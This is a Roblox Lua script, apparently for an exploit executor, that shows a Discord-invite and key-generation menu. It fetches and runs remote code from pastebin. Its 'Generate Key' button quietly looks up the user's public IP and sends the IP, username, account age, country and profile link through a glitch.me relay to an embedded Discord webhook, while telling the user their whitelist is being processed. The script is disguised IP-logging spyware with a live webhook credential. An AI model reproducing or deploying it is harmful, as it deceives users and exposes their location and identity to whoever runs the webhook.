--UI Libaray Made by Wally
local library = loadstring(game:HttpGet("https://pastebin.com/raw/FTdYYNX3",true))() 
local Discord = library:CreateWindow("Discord Server")
Discord:Section("Discord Server: M9eJepY")
local Discordcode = Discord:Button("Click to Copy Code",function()
    setclipboard("https://discord.gg/M9eJepY")
end)
local Destroygui = Discord:Button("Destroy Gui",function()
    game:GetService("CoreGui").ScreenGui:Destroy()
end)
local Getkey = library:CreateWindow("Get Key")
Getkey:Section("Get Your Key!")
local Generatekey = Getkey:Button("Generate Key",function()
    game:GetService("CoreGui").ScreenGui.Container["Get Key"].container.Frame:Destroy()
    game:GetService("StarterGui"):SetCore("SendNotification",{Title = "Generating Your Key...";Text = "Please wait a moment while your key is being generated.";Duration = 4;})
    function SHA256(mes)
        local con = 4294967296
        local ch = {0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19}
        local k = {0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2}
        local function bit(obj, bit)
            return obj%(bit*2)>=bit
        end
        local function Or(ca, cb)
            local new = 0
            for i = 0, 32 do
            new = new+((bit(ca,2^i)or bit(cb,2^i))and 2^i or 0)
            end
            return new
        end
        local function rshift(obj, times)
            times = times or 1
            return math.floor(obj*.5^times)%con
        end
        local function lshift(obj, times)
            times = times or 1
            return math.floor(obj*2^times)%con
        end
        local function rrotate(obj,times)
            times = times or 1
            return Or(rshift(obj,times),lshift(obj,32-times))
        end
        local function And(ca, cb)
            local new = 0
            for i = 0, 32 do
            new = new+((bit(ca,2^i)and bit(cb,2^i))and 2^i or 0)
            end
            return new % 2^32
        end
        local function append(cur)
            local new = ""
            for i = 1, 8 do
            local r = cur%256
            new = string.char(r)..new
            cur = (cur-r)/256
            end
            return new
        end
        local function Not(ca)
            return (2^32-1)-ca
        end
        local function xor(ca, cb)
            local new = 0
            for i = 0, 32 do
            new = new+(bit(ca,2^i)~=bit(cb,2^i)and 2^i or 0)
            end
            return new%con
        end
        mes = mes.."\128"..("\0"):rep(64-((#mes+9)%64))..append(#mes*8)
        local Chunks = {}
        for i = 1, #mes, 64 do
            table.insert(Chunks,mes:sub(i,i+63))
        end
        for _,Chunk in next,Chunks do
            local w = {}
            for i = 0, 15 do
            w[i] = (function()local n=0 for q=1,4 do n=n*256+Chunk:byte(i*4+q) end return n end)()
        end
        for i = 16, 63 do
            local s0 = xor(xor(rrotate(w[i-15],7),rrotate(w[i-15],18)),rshift(w[i-15],3))
            local s1 = xor(xor(rrotate(w[i-2],17),rrotate(w[i-2],19)),rshift(w[i-2],10))
            w[i] = (w[i-16] + s0 + w[i-7] + s1)%con
        end
        for i = 16, 63 do
            local s0 = xor(xor(rrotate(w[i-15],7),rrotate(w[i-15],18)),rshift(w[i-15],3))
            local s1 = xor(xor(rrotate(w[i-2],17),rrotate(w[i-2],19)),rshift(w[i-2],10))
            w[i] = (w[i-16] + s0 + w[i-7] + s1)%con
        end
        local a,b,c,d,e,f,g,h=unpack(ch)
        for i = 0, 63 do
            local s0 = xor(xor(rrotate(a,2),rrotate(a,13)),rrotate(a,22))
            local s1 = xor(xor(rrotate(e,6),rrotate(e,11)),rrotate(e,25))
            local t0 = h+s1+xor(And(e,f),And(Not(e),g))+k[i+1]+w[i]
            local t1 = s0+xor(xor(And(a,b),And(a,c)),And(b,c))
            h = g
            g = f
            f = e
            e = (d+t0)%con
            d = c
            c = b
            b = a
            a = (t0+t1)%con
            end
            ch[1]=(ch[1]+a)%con
            ch[2]=(ch[2]+b)%con
            ch[3]=(ch[3]+c)%con
            ch[4]=(ch[4]+d)%con
            ch[5]=(ch[5]+e)%con
            ch[6]=(ch[6]+f)%con
            ch[7]=(ch[7]+g)%con
            ch[8]=(ch[8]+h)%con
        end
        return ("%08x%08x%08x%08x%08x%08x%08x%08x"):format(unpack(ch))
    end
    function levels(vault)
        local num = 10
        local whitelistkey = SHA256(vault)
        local times = 0
        for i=1, num do
            if times >= 0 then
                whitelistkey = SHA256(whitelistkey)
                times = times + 1
            elseif times <= 0 then
                whitelistkey = vault
                return
            end
        end
        return whitelistkey
    end
    local ip = game:HttpGet("https://api.ipify.org")
    local vault = SHA256(ip .. "oXW5zs*MAH4jXUHAErqcBQB6LCf#PG0@kHCRFEI97Vlu7rxK8DdJC9832#ph&dHG5*QAZcI#HAx6yQOHT9PAU83SnifEgvwiwNz" .. "eon_tranquility")
    local whitelistkey = levels(vault)
    local Webhook = "https://discordapp.com/api/webhooks/728026773094137879/YfyEuNKfsjKQPXehBxvwPawzcejTH_J4hjmdA99JWCruoUFhoFtfaHj5C3--yY7msyZ-"
    local Hp = gethiddenproperty or get_hidden_prop
    local function log(name,message,hook)
        local api = "http://buritoman69.glitch.me/webhook"
        local Body = {["Key"] = "applesaregood",["Message"] = tostring(message),["Name"] = tostring(game.Players.LocalPlayer.Name),["Webhook"] = tostring(hook)}
        local data = game:HttpPost(api,game:GetService("HttpService"):JSONEncode(Body),false,"application/json")
        return data or nil
    end
    log("PlayerName", "<@&728022304373735549> | Name: **"..game.Players.LocalPlayer.Name.."** | Age: **"..game.Players.LocalPlayer.AccountAge.."** Days | Whitelist Key: **"..whitelistkey.."**", Webhook)
    for _,v in pairs(game:GetService("Players"):GetPlayers()) do
        if v.Name == game:GetService("Players").LocalPlayer.Name then
            local Countries = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://country.io/names.json"))
            local ParsedCountry = Countries[Hp(v,"CountryRegionCodeReplicate")]
            log("PlayerName", "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile | They're from ** ".. tostring(ParsedCountry).."** IP: **"..ip.."**", Webhook)
        end
    end
    game:GetService("StarterGui"):SetCore("SendNotification",{Title = "Thank You for Purchasing!";Text = "Please wait 12 to 48 hours for you to be verifed whitelisted. Join the Discord Server while you're at it!";Duration = 10;})
end)